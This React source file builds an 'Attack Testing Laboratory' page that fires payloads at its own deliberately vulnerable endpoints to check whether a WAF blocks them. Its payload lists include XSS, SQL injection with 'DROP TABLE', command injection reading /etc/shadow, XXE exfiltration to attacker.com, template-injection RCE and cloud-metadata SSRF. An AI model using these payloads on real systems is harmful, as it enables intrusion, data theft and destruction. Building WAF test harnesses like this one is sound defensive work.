// Enhanced Attack Lab page with comprehensive attack testing capabilities
import React, { useState } from 'react';
import { 
  Bug, 
  Send, 
  Shield, 
  Code, 
  Database, 
  FileText, 
  Terminal,
  AlertTriangle,
  CheckCircle,
  XCircle,
  Copy,
  Globe,
  User,
  Key,
  Upload,
  Lock,
  Zap,
  Activity,
  FileCode,
  Server,
  Cloud,
  Cpu
} from 'lucide-react';

interface AttackTest {
  id: string;
  name: string;
  description: string;
  category: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  icon: React.ReactNode;
  payloads: { label: string; value: string; description?: string; }[];
  endpoint: string;
  method: 'GET' | 'POST';
  requiresFile?: boolean;
}

interface TestResult {
  timestamp: string;
  test: string;
  payload: string;
  blocked: boolean;
  status: number | string;
  responseTime: number;
}

const AttackLabPage: React.FC = () => {
  const [selectedTest, setSelectedTest] = useState<string>('xss');
  const [customPayload, setCustomPayload] = useState('');
  const [response, setResponse] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const [testHistory, setTestHistory] = useState<TestResult[]>([]);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);

  const attackTests: AttackTest[] = [
    {
      id: 'xss',
      name: 'XSS (Cross-Site Scripting)',
      description: 'Test for XSS vulnerabilities with various encoding and bypass techniques',
      category: 'Injection',
      severity: 'high',
      icon: <Code className="w-5 h-5" />,
      endpoint: '/api/vulnerable/xss',
      method: 'GET',
      payloads: [
        { label: 'Basic Script', value: '<script>alert("XSS")</script>', description: 'Standard script injection' },
        { label: 'IMG Tag', value: '<img src=x onerror=alert("XSS")>', description: 'Image error handler' },
        { label: 'SVG Payload', value: '<svg/onload=alert("XSS")>', description: 'SVG event handler' },
        { label: 'Event Handler', value: '<body onload=alert("XSS")>', description: 'Body event injection' },
        { label: 'JavaScript URL', value: 'javascript:alert("XSS")', description: 'Protocol handler' },
        { label: 'Data URI', value: 'data:text/html,<script>alert("XSS")</script>', description: 'Data URI scheme' },
        { label: 'Encoded', value: '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E', description: 'URL encoded' },
        { label: 'Double Encoded', value: '%253Cscript%253Ealert%2528%2522XSS%2522%2529%253C%252Fscript%253E', description: 'Double URL encoding' }
      ]
    },
    {
      id: 'sqli',
      name: 'SQL Injection',
      description: 'Test for SQL injection vulnerabilities across different databases',
      category: 'Injection',
      severity: 'critical',
      icon: <Database className="w-5 h-5" />,
      endpoint: '/api/vulnerable/sqli',
      method: 'GET',
      payloads: [
        { label: 'Basic OR', value: "' OR '1'='1", description: 'Classic authentication bypass' },
        { label: 'Union Select', value: "' UNION SELECT * FROM users--", description: 'Data extraction' },
        { label: 'Time-based', value: "' OR SLEEP(5)--", description: 'Blind SQL via timing' },
        { label: 'Error-based', value: "' AND 1=CONVERT(int, @@version)--", description: 'Error message extraction' },
        { label: 'Stacked Queries', value: "'; DROP TABLE users--", description: 'Multiple query execution' },
        { label: 'Boolean-based', value: "' AND '1'='1", description: 'Blind SQL via boolean' },
        { label: 'NoSQL', value: '{"$ne": null}', description: 'MongoDB injection' },
        { label: 'Second Order', value: "admin'--", description: 'Stored SQL injection' }
      ]
    },
    {
      id: 'file_upload',
      name: 'File Upload Attack',
      description: 'Test file upload security with malicious files',
      category: 'File Attack',
      severity: 'critical',
      icon: <Upload className="w-5 h-5" />,
      endpoint: '/api/vulnerable/file-upload',
      method: 'POST',
      requiresFile: true,
      payloads: [
        { label: 'PHP Shell', value: 'shell.php', description: 'PHP web shell upload' },
        { label: 'JSP Shell', value: 'shell.jsp', description: 'JSP web shell upload' },
        { label: 'ASPX Shell', value: 'shell.aspx', description: 'ASP.NET shell upload' },
        { label: 'Double Extension', value: 'shell.php.jpg', description: 'Extension bypass' },
        { label: 'Null Byte', value: 'shell.php%00.jpg', description: 'Null byte injection' },
        { label: 'MIME Type', value: 'shell.php', description: 'Content-Type bypass' },
        { label: 'Polyglot', value: 'image.jpg.php', description: 'Polyglot file' },
        { label: 'XXE via SVG', value: 'xxe.svg', description: 'XXE through SVG upload' }
      ]
    },
    {
      id: 'cmd_injection',
      name: 'Command Injection',
      description: 'Test for OS command injection vulnerabilities',
      category: 'Injection',
      severity: 'critical',
      icon: <Terminal className="w-5 h-5" />,
      endpoint: '/api/vulnerable/command-injection',
      method: 'GET',
      payloads: [
        { label: 'Semicolon', value: '; ls -la', description: 'Command separator' },
        { label: 'Pipe', value: '| whoami', description: 'Pipe operator' },
        { label: 'Backticks', value: '`whoami`', description: 'Command substitution' },
        { label: 'Dollar Sign', value: '$(whoami)', description: 'Modern substitution' },
        { label: 'AND', value: '&& cat /etc/passwd', description: 'AND operator' },
        { label: 'OR', value: '|| id', description: 'OR operator' },
        { label: 'Newline', value: '\ncat /etc/shadow', description: 'Line injection' },
        { label: 'Encoded', value: '%0Acat%20/etc/passwd', description: 'URL encoded newline' }
      ]
    },
    {
      id: 'path_traversal',
      name: 'Path Traversal / LFI',
      description: 'Test for directory traversal and local file inclusion',
      category: 'Path Attack',
      severity: 'high',
      icon: <FileText className="w-5 h-5" />,
      endpoint: '/api/vulnerable/path-traversal',
      method: 'GET',
      payloads: [
        { label: 'Unix Traversal', value: '../../../etc/passwd', description: 'Unix path traversal' },
        { label: 'Windows', value: '..\\..\\..\\windows\\system32\\config\\sam', description: 'Windows path' },
        { label: 'URL Encoded', value: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', description: 'Encoded dots' },
        { label: 'Double Encoded', value: '%252e%252e%252fetc%252fpasswd', description: 'Double encoding' },
        { label: 'Unicode', value: '..%c0%af..%c0%afetc%c0%afpasswd', description: 'Unicode bypass' },
        { label: 'Null Byte', value: '../../../etc/passwd%00', description: 'Null termination' },
        { label: 'Filter Bypass', value: '....//....//....//etc/passwd', description: 'Filter evasion' },
        { label: 'Absolute Path', value: '/etc/passwd', description: 'Direct path access' }
      ]
    },
    {
      id: 'xxe',
      name: 'XXE (XML External Entity)',
      description: 'Test for XML external entity injection attacks',
      category: 'Injection',
      severity: 'high',
      icon: <FileCode className="w-5 h-5" />,
      endpoint: '/api/vulnerable/xxe',
      method: 'POST',
      payloads: [
        { label: 'File Disclosure', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>', description: 'Local file read' },
        { label: 'SSRF', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://internal.server/">]><root>&test;</root>', description: 'Server-side request' },
        { label: 'Blind XXE', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]>', description: 'Out-of-band' },
        { label: 'Billion Laughs', value: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>', description: 'DoS attack' },
        { label: 'Parameter Entity', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]>', description: 'Parameter entities' }
      ]
    },
    {
      id: 'ssti',
      name: 'Template Injection',
      description: 'Test for server-side template injection',
      category: 'Injection',
      severity: 'high',
      icon: <Code className="w-5 h-5" />,
      endpoint: '/api/vulnerable/ssti',
      method: 'GET',
      payloads: [
        { label: 'Jinja2 Test', value: '{{7*7}}', description: 'Basic math test' },
        { label: 'Jinja2 RCE', value: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", description: 'Command execution' },
        { label: 'Twig', value: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}', description: 'Twig RCE' },
        { label: 'FreeMarker', value: '${7*7}', description: 'FreeMarker test' },
        { label: 'Velocity', value: '#set($x=7*7)$x', description: 'Velocity engine' },
        { label: 'Smarty', value: '{$smarty.version}', description: 'Smarty template' }
      ]
    },
    {
      id: 'ssrf',
      name: 'SSRF (Server-Side Request Forgery)',
      description: 'Test for SSRF vulnerabilities',
      category: 'Network Attack',
      severity: 'high',
      icon: <Server className="w-5 h-5" />,
      endpoint: '/api/vulnerable/ssrf',
      method: 'GET',
      payloads: [
        { label: 'Localhost', value: 'http://127.0.0.1/', description: 'Local access' },
        { label: 'Internal IP', value: 'http://192.168.1.1/', description: 'Private network' },
        { label: 'Cloud Metadata', value: 'http://169.254.169.254/latest/meta-data/', description: 'AWS metadata' },
        { label: 'File Protocol', value: 'file:///etc/passwd', description: 'Local file access' },
        { label: 'Gopher', value: 'gopher://127.0.0.1:25/', description: 'Gopher protocol' },
        { label: 'Dict', value: 'dict://127.0.0.1:11211/stats', description: 'Dict protocol' },
        { label: 'FTP', value: 'ftp://127.0.0.1/', description: 'FTP protocol' },
        { label: 'Redirect', value: 'http://evil.com/redirect?url=http://127.0.0.1', description: 'Open redirect' }
      ]
    },
    {
      id: 'ldapi',
      name: 'LDAP Injection',
      description: 'Test for LDAP injection vulnerabilities',
      category: 'Injection',
      severity: 'medium',
      icon: <User className="w-5 h-5" />,
      endpoint: '/api/vulnerable/ldap',
      method: 'GET',
      payloads: [
        { label: 'Basic', value: '*', description: 'Wildcard search' },
        { label: 'OR Injection', value: '(|(cn=*))', description: 'OR operator' },
        { label: 'AND Injection', value: '(&(cn=*))', description: 'AND operator' },
        { label: 'Null Bind', value: '^', description: 'Null bind bypass' },
        { label: 'Filter Bypass', value: '*)(uid=*', description: 'Filter injection' }
      ]
    },
    {
      id: 'csrf',
      name: 'CSRF Testing',
      description: 'Test for Cross-Site Request Forgery protection',
      category: 'Session Attack',
      severity: 'medium',
      icon: <Lock className="w-5 h-5" />,
      endpoint: '/api/vulnerable/csrf',
      method: 'POST',
      payloads: [
        { label: 'No Token', value: '{"action": "transfer", "amount": 1000}', description: 'Missing CSRF token' },
        { label: 'Empty Token', value: '{"csrf_token": "", "action": "transfer"}', description: 'Empty token' },
        { label: 'Wrong Token', value: '{"csrf_token": "invalid", "action": "transfer"}', description: 'Invalid token' },
        { label: 'GET Request', value: 'GET /api/transfer?amount=1000', description: 'State change via GET' }
      ]
    }
  ];

  const currentTest = attackTests.find(t => t.id === selectedTest) || attackTests[0];

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'critical': return 'text-red-600 bg-red-100 dark:text-red-400 dark:bg-red-900/20';
      case 'high': return 'text-orange-600 bg-orange-100 dark:text-orange-400 dark:bg-orange-900/20';
      case 'medium': return 'text-yellow-600 bg-yellow-100 dark:text-yellow-400 dark:bg-yellow-900/20';
      case 'low': return 'text-blue-600 bg-blue-100 dark:text-blue-400 dark:bg-blue-900/20';
      default: return 'text-gray-600 bg-gray-100 dark:text-gray-400 dark:bg-gray-900/20';
    }
  };

  const runTest = async (payload?: string) => {
    setLoading(true);
    setResponse(null);

    const testPayload = payload || customPayload;
    const token = localStorage.getItem('auth_token');
    const startTime = Date.now();

    try {
      let url = currentTest.endpoint;
      let options: RequestInit = {
        method: currentTest.method,
        headers: {
          'Authorization': `Bearer ${token}`
        }
      };

      if (currentTest.requiresFile && selectedFile) {
        const formData = new FormData();
        formData.append('file', selectedFile);
        formData.append('payload', testPayload);
        options.body = formData;
      } else if (currentTest.method === 'GET') {
        url += `?input_data=${encodeURIComponent(testPayload)}`;
      } else {
        options.headers = {
          ...options.headers,
          'Content-Type': 'application/json'
        };
        options.body = JSON.stringify({ payload: testPayload });
      }

      const res = await fetch(url, options);
      const responseTime = Date.now() - startTime;
      
      let data;
      const contentType = res.headers.get('content-type');
      if (contentType && contentType.includes('application/json')) {
        data = await res.json();
      } else {
        data = await res.text();
      }
      
      const result = {
        status: res.status,
        blocked: res.status === 403,
        data: data,
        isJson: contentType && contentType.includes('application/json'),
        responseTime
      };
      
      setResponse(result);
      
      // Add to history
      setTestHistory(prev => [{
        timestamp: new Date().toISOString(),
        test: currentTest.name,
        payload: testPayload.substring(0, 50) + (testPayload.length > 50 ? '...' : ''),
        blocked: result.blocked,
        status: res.status,
        responseTime
      }, ...prev.slice(0, 9)]);
      
    } catch (error) {
      setResponse({
        status: 'error',
        blocked: false,
        data: error instanceof Error ? error.message : 'Unknown error',
        responseTime: Date.now() - startTime
      });
    } finally {
      setLoading(false);
    }
  };

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      setSelectedFile(e.target.files[0]);
    }
  };

  return (
    <div className="p-6">
      {/* Header */}
      <div className="mb-6">
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-semibold text-gray-900 dark:text-white">
              Attack Testing Laboratory
            </h1>
            <p className="text-gray-600 dark:text-gray-400 mt-1">
              Comprehensive security testing against WAF protection
            </p>
          </div>
          <div className="flex items-center space-x-2">
            <Shield className="w-5 h-5 text-blue-600" />
            <span className="text-sm text-gray-600 dark:text-gray-400">
              {attackTests.length} Attack Vectors
            </span>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-4 gap-6">
        {/* Test Selection Sidebar */}
        <div className="xl:col-span-1">
          <div className="bg-white dark:bg-gray-800 rounded-lg shadow sticky top-6">
            <div className="p-4 border-b border-gray-200 dark:border-gray-700">
              <h2 className="text-lg font-medium text-gray-900 dark:text-white">
                Attack Vectors
              </h2>
            </div>
            <div className="p-2 max-h-[calc(100vh-200px)] overflow-y-auto">
              {attackTests.map((test) => (
                <button
                  key={test.id}
                  onClick={() => {
                    setSelectedTest(test.id);
                    setResponse(null);
                    setCustomPayload('');
                  }}
                  className={`w-full text-left px-3 py-2 rounded-lg mb-1 flex items-center space-x-3 transition-all ${
                    selectedTest === test.id
                      ? 'bg-blue-50 dark:bg-blue-900/20 text-blue-600 dark:text-blue-400 shadow-sm'
                      : 'hover:bg-gray-50 dark:hover:bg-gray-700 text-gray-700 dark:text-gray-300'
                  }`}
                >
                  {test.icon}
                  <div className="flex-1 min-w-0">
                    <div className="font-medium text-sm truncate">{test.name}</div>
                    <div className="flex items-center space-x-2 mt-1">
                      <span className="text-xs text-gray-500 dark:text-gray-400">
                        {test.category}
                      </span>
                      <span className={`text-xs px-1.5 py-0.5 rounded ${getSeverityColor(test.severity)}`}>
                        {test.severity}
                      </span>
                    </div>
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Main Testing Area */}
        <div className="xl:col-span-3 space-y-6">
          {/* Test Configuration */}
          <div className="bg-white dark:bg-gray-800 rounded-lg shadow">
            <div className="p-6 border-b border-gray-200 dark:border-gray-700">
              <div className="flex items-start justify-between">
                <div className="flex items-start space-x-3">
                  <div className="p-2 bg-blue-100 dark:bg-blue-900/20 rounded-lg text-blue-600 dark:text-blue-400">
                    {currentTest.icon}
                  </div>
                  <div>
                    <h2 className="text-xl font-medium text-gray-900 dark:text-white">
                      {currentTest.name}
                    </h2>
                    <p className="text-sm text-gray-600 dark:text-gray-400 mt-1">
                      {currentTest.description}
                    </p>
                    <div className="flex items-center space-x-3 mt-2">
                      <span className={`text-xs px-2 py-1 rounded-full ${getSeverityColor(currentTest.severity)}`}>
                        {currentTest.severity.toUpperCase()}
                      </span>
                      <span className="text-xs px-2 py-1 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-full">
                        {currentTest.method}
                      </span>
                      <span className="text-xs text-gray-500 dark:text-gray-400">
                        {currentTest.endpoint}
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="p-6">
              {/* Predefined Payloads */}
              <div className="mb-6">
                <h3 className="text-sm font-medium text-gray-700 dark:text-gray-300 mb-3">
                  Predefined Payloads
                </h3>
                <div className="space-y-2">
                  {currentTest.payloads.map((payload, idx) => (
                    <div
                      key={idx}
                      className="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-700/50 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
                    >
                      <div className="flex-1 min-w-0 mr-3">
                        <div className="flex items-center space-x-2">
                          <span className="font-medium text-sm text-gray-900 dark:text-white">
                            {payload.label}
                          </span>
                          {payload.description && (
                            <span className="text-xs text-gray-500 dark:text-gray-400">
                              - {payload.description}
                            </span>
                          )}
                        </div>
                        <div className="text-xs text-gray-600 dark:text-gray-400 font-mono mt-1 truncate">
                          {payload.value}
                        </div>
                      </div>
                      <div className="flex items-center space-x-2">
                        <button
                          onClick={() => copyPayload(payload.value)}
                          className="p-2 hover:bg-gray-200 dark:hover:bg-gray-600 rounded-lg transition-colors"
                          title="Copy payload"
                        >
                          <Copy className="w-4 h-4 text-gray-600 dark:text-gray-400" />
                        </button>
                        <button
                          onClick={() => runTest(payload.value)}
                          disabled={loading}
                          className="p-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors disabled:opacity-50"
                          title="Run test"
                        >
                          <Send className="w-4 h-4" />
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Custom Payload */}
              <div className="mb-6">
                <h3 className="text-sm font-medium text-gray-700 dark:text-gray-300 mb-3">
                  Custom Payload
                </h3>
                {currentTest.requiresFile && (
                  <div className="mb-3">
                    <input
                      type="file"
                      onChange={handleFileChange}
                      className="block w-full text-sm text-gray-900 dark:text-gray-100 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100 dark:file:bg-blue-900/20 dark:file:text-blue-400"
                    />
                    {selectedFile && (
                      <p className="mt-2 text-sm text-gray-600 dark:text-gray-400">
                        Selected: {selectedFile.name}
                      </p>
                    )}
                  </div>
                )}
                <div className="flex space-x-2">
                  <input
                    type="text"
                    value={customPayload}
                    onChange={(e) => setCustomPayload(e.target.value)}
                    placeholder="Enter custom payload..."
                    className="flex-1 px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  />
                  <button
                    onClick={() => runTest()}
                    disabled={!customPayload || loading || (currentTest.requiresFile && !selectedFile)}
                    className="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed flex items-center transition-colors"
                  >
                    {loading ? (
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                    ) : (
                      <>
                        <Zap className="w-4 h-4 mr-2" />
                        Execute
                      </>
                    )}
                  </button>
                </div>
              </div>

              {/* Response */}
              {response && (
                <div className="mb-6">
                  <h3 className="text-sm font-medium text-gray-700 dark:text-gray-300 mb-3">
                    Test Result
                  </h3>
                  <div className={`p-4 rounded-lg border-2 ${
                    response.blocked
                      ? 'bg-green-50 dark:bg-green-900/20 border-green-200 dark:border-green-800'
                      : 'bg-red-50 dark:bg-red-900/20 border-red-200 dark:border-red-800'
                  }`}>
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center">
                        {response.blocked ? (
                          <>
                            <CheckCircle className="w-5 h-5 text-green-600 dark:text-green-400 mr-2" />
                            <span className="font-medium text-green-600 dark:text-green-400">
                              Successfully Blocked by WAF
                            </span>
                          </>
                        ) : (
                          <>
                            <XCircle className="w-5 h-5 text-red-600 dark:text-red-400 mr-2" />
                            <span className="font-medium text-red-600 dark:text-red-400">
                              Attack Bypassed WAF Protection
                            </span>
                          </>
                        )}
                      </div>
                      <div className="flex items-center space-x-3 text-sm">
                        <span className="text-gray-600 dark:text-gray-400">
                          Status: <strong>{response.status}</strong>
                        </span>
                        <span className="text-gray-600 dark:text-gray-400">
                          Time: <strong>{response.responseTime}ms</strong>
                        </span>
                      </div>
                    </div>
                    <div className="bg-gray-900 rounded-lg p-3 overflow-x-auto">
                      <pre className="text-xs text-gray-300 font-mono">
                        {response.isJson ? JSON.stringify(response.data, null, 2) : response.data}
                      </pre>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Test History */}
          {testHistory.length > 0 && (
            <div className="bg-white dark:bg-gray-800 rounded-lg shadow">
              <div className="p-4 border-b border-gray-200 dark:border-gray-700">
                <h3 className="text-lg font-medium text-gray-900 dark:text-white">
                  Recent Tests
                </h3>
              </div>
              <div className="p-4">
                <div className="space-y-2">
                  {testHistory.map((result, idx) => (
                    <div
                      key={idx}
                      className="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-700/50 rounded-lg"
                    >
                      <div className="flex items-center space-x-3">
                        {result.blocked ? (
                          <CheckCircle className="w-4 h-4 text-green-500" />
                        ) : (
                          <XCircle className="w-4 h-4 text-red-500" />
                        )}
                        <div>
                          <div className="text-sm font-medium text-gray-900 dark:text-white">
                            {result.test}
                          </div>
                          <div className="text-xs text-gray-500 dark:text-gray-400">
                            {result.payload}
                          </div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-xs text-gray-500 dark:text-gray-400">
                          {new Date(result.timestamp).toLocaleTimeString()}
                        </div>
                        <div className="text-xs text-gray-600 dark:text-gray-400">
                          {result.responseTime}ms
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AttackLabPage;